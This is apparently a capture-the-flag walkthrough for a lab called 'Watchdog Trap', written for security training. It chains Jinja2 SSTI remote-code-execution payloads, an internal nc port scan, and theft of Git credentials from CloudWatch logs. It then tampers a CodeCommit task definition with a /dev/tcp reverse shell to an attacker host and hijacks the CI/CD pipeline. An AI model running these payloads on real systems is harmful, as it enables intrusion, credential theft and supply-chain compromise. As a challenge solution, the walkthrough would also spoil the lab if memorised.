# Watchdog Trap - Walkthrough

## Exploitation Route

| Stage | Action | Technique |
|-------|--------|-----------|
| 0 | Confirm SSTI vulnerability on webapp Summary field | Server-Side Template Injection |
| 1 | Execute OS commands via SSTI, scan internal subnet | RCE, internal port scan |
| 2 | Access Prowler dashboard, extract CloudWatch log group name | Unauthenticated internal service access |
| 3 | Access Steampipe SQL console, query CloudWatch log events | Unauthenticated internal service access |
| 4 | Extract plaintext Git credentials from build logs | Credential harvesting |
| 5 | Clone CodeCommit repo, tamper `task-definition.json` | Supply chain tampering |
| 6 | Push to main branch, trigger CodePipeline automatically | CI/CD pipeline hijacking |
| 7 | Wait for ECS Blue/Green deployment, receive reverse shell, read FLAG | Container escape / exfiltration |

## Summary

1. SSTI RCE via Flask `render_template_string`
2. Internal port scan → Prowler (9090), Steampipe (9194)
3. Prowler → `/corp/deploy-pipeline` CloudWatch log group KMS FAIL finding
4. Steampipe SQL → CloudWatch log event → Git credentials exposed in plaintext
5. `git clone jsn-config` → `task-definition.json` command injection
6. `git push main` → CodePipeline auto-trigger
7. ECS Blue/Green deploy → reverse shell → `echo $FLAG`

---

## Detailed Walkthrough

### Step 0: Identify SSTI Entry Point

Navigate to `http://<webapp_ip>` and locate the **Summary** field in the incident report form.

**Hint 1** — Test for Jinja2 template evaluation:
```
{{7*7}}
```
If the output renders as `49`, the SSTI vulnerability is confirmed.

**Hint 2** — Enumerate template subclasses:
```
{{''.__class__.__mro__[1].__subclasses__()}}
```

---

### Step 1: Internal Recon via RCE

Use the SSTI vulnerability to execute OS commands on the server and discover internal hosts.

**Hint 1** — Basic RCE payload using `config` globals:
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Hint 2** — Check network interfaces to identify the internal subnet:
```
{{config.__class__.__init__.__globals__['os'].popen('ip addr').read()}}
```

**Hint 3** — Scan the tools subnet (10.0.6.0/24) for open ports 9090 and 9194:
```
{{config.__class__.__init__.__globals__['os'].popen('for i in $(seq 1 254); do (nc -zv -w1 10.0.6.$i 9090 2>&1 | grep -v "refused") & done; wait').read()}}
```
Note the IPs where ports 9090 (Prowler) and 9194 (Steampipe) are open.

---

### Step 2: Prowler Dashboard — Extract Log Group Clue

Access the Prowler security dashboard via the SSTI-proxied request.

**Hint 1** — Fetch the Prowler dashboard HTML:
```
{{config.__class__.__init__.__globals__['os'].popen('curl -s http://10.0.6.<X>:9090/').read()}}
```
Replace `10.0.6.<X>` with the Prowler instance IP from Step 1.

**Hint 2** — Look for the following finding in the output:
```
[MEDIUM] cloudwatch_log_group_kms_encryption_enabled — FAIL
```
From the Resource ARN, extract the log group name: `/corp/deploy-pipeline`

---

### Step 3: Steampipe SQL Console — Query CloudWatch Logs

Access the Steampipe query console and run SQL against AWS CloudWatch.

**Hint 1** — Verify Steampipe is reachable:
```
{{config.__class__.__init__.__globals__['os'].popen('curl -s http://10.0.6.<Y>:9194/').read()}}
```

**Hint 2** — List available CloudWatch log groups:
```
{{config.__class__.__init__.__globals__['os'].popen('curl -s -X POST http://10.0.6.<Y>:9194/query -H "Content-Type: application/json" -d "{\"sql\":\"select log_group_name from aws_cloudwatch_log_group limit 20\"}"').read()}}
```

**Hint 3** — Query log events from the pipeline log group:
```sql
select log_stream_name, message, timestamp
from aws_cloudwatch_log_event
where log_group_name = '/corp/deploy-pipeline'
order by timestamp desc
limit 50;
```

---

### Step 4: Extract Git Credentials from Logs

Search the CloudWatch log events for the `git clone` command that exposes credentials.

**Hint 1** — Filter for clone events:
```sql
select message, timestamp
from aws_cloudwatch_log_event
where log_group_name = '/corp/deploy-pipeline'
  and message like '%Cloning https://%'
order by timestamp desc
limit 10;
```

**Hint 2** — The log message will contain:
```
Cloning https://dev-user-at-123456789012:<PASSWORD>@git-codecommit.us-east-1.amazonaws.com/v1/repos/jsn-config
```
Extract `username` and `password` from the URL (URL-decode if necessary).

---

### Step 5: Clone CodeCommit Repo and Tamper Task Definition

Use the extracted credentials to clone the `jsn-config` repository and inject a reverse shell command.

**Hint 1** — Clone the repository:
```bash
git clone https://<USERNAME>:<PASSWORD>@git-codecommit.us-east-1.amazonaws.com/v1/repos/jsn-config
cd jsn-config
```

**Hint 2** — In `task-definition.json`, add a `command` field to `containerDefinitions[0]`:
```json
"command": ["bash", "-c", "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1 & node server.js"]
```
Replace `<ATTACKER_IP>` and `<PORT>` with your listener address.

---

### Step 6: Trigger the Pipeline via Git Push

Commit the modified task definition and push to the `main` branch.

```bash
git config user.email "ops@jsn.internal"
git config user.name "JSN Ops"
git add task-definition.json
git commit -m "update task definition"
git push origin main
```

CodePipeline's `PollForSourceChanges` will detect the push and automatically trigger the pipeline (Source → Build → Deploy).

---

### Step 7: FLAG Retrieval via Reverse Shell

**Hint 1** — Start your listener before pushing:
```bash
nc -lvnp <PORT>
```

**Hint 2** — Wait approximately 5–10 minutes for the CodePipeline execution and ECS Blue/Green deployment to complete.

**Hint 3** — Once the reverse shell connects, retrieve the FLAG:
```bash
echo $FLAG
```

The FLAG is injected as an environment variable from AWS Secrets Manager into the ECS task at deployment time.
